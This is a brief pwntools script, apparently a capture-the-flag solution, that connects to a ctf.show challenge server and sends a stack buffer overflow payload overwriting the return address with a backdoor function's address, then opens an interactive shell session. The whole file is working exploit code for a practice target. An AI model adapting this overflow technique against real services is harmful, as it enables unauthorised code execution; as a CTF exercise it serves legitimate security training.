from pwn import *
r =remote('pwn.challenge.ctf.show',28291)
backdoor = 0x08048521
offset = 0x12
payload = offset * b'a' + b'bbbb'+p32(backdoor)
r.sendline(payload)
r.interactive()